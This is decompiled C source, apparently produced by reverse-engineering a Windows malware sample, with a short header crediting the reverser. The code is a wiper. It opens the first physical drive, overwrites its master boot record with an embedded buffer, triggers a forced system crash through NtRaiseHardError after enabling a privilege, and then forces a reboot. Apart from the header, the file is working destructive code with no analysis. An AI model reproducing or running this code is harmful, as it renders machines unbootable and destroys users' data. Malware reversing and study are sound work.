/* 
Reversed by sigma
maybe obufuscated
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
BOOL sub_401090();

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *ExitWindowsEx)(UINT uFlags, DWORD dwReason);
_UNKNOWN unk_403000; // weak


//----- (00401000) --------------------------------------------------------
int start()
{
  HANDLE FileA; // ebx
  HLOCAL v1; // ebp
  int result; // eax
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-4h] BYREF

  FileA = CreateFileA("\\\\.\\PhysicalDrive0", 0xC0000000, 3u, 0, 3u, 0, 0);
  v1 = LocalAlloc(0x40u, 0x10000u);
  qmemcpy(v1, &unk_403000, 0x200u);
  SetFilePointer(FileA, 0, 0, 0);
  if ( WriteFile(FileA, v1, 0x10000u, &NumberOfBytesWritten, 0) )
  {
    CloseHandle(FileA);
    sub_401090();
    return 0;
  }
  else
  {
    CloseHandle(FileA);
    result = 0;
    MEMORY[0] = 0;
  }
  return result;
}
// 401090: using guessed type int sub_401090(void);

//----- (00401090) --------------------------------------------------------
BOOL sub_401090()
{
  HMODULE LibraryA; // esi
  FARPROC RtlAdjustPrivilege; // edi
  FARPROC NtRaiseHardError; // eax
  void (__cdecl *v3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // esi
  HANDLE CurrentProcess; // eax
  char v6; // [esp+Fh] [ebp-19h] BYREF
  HANDLE TokenHandle; // [esp+10h] [ebp-18h] BYREF
  char v8[4]; // [esp+14h] [ebp-14h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+18h] [ebp-10h] BYREF

  LibraryA = LoadLibraryA("ntdll");
  RtlAdjustPrivilege = GetProcAddress(LibraryA, "RtlAdjustPrivilege");
  NtRaiseHardError = GetProcAddress(LibraryA, "NtRaiseHardError");
  v3 = (void (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;
  if ( RtlAdjustPrivilege && NtRaiseHardError )
  {
    ((void (__cdecl *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v6);
    v3(-1073741790, 0, 0, 0, 6, v8);
  }
  CurrentProcess = GetCurrentProcess();
  OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle);
  LookupPrivilegeValueA(0, "SeShutdownPrivilege", &NewState.Privileges[0].Luid);
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = 2;
  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
  return ExitWindowsEx(6u, 0x10007u);
}
// 401090: using guessed type char var_14[4];

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
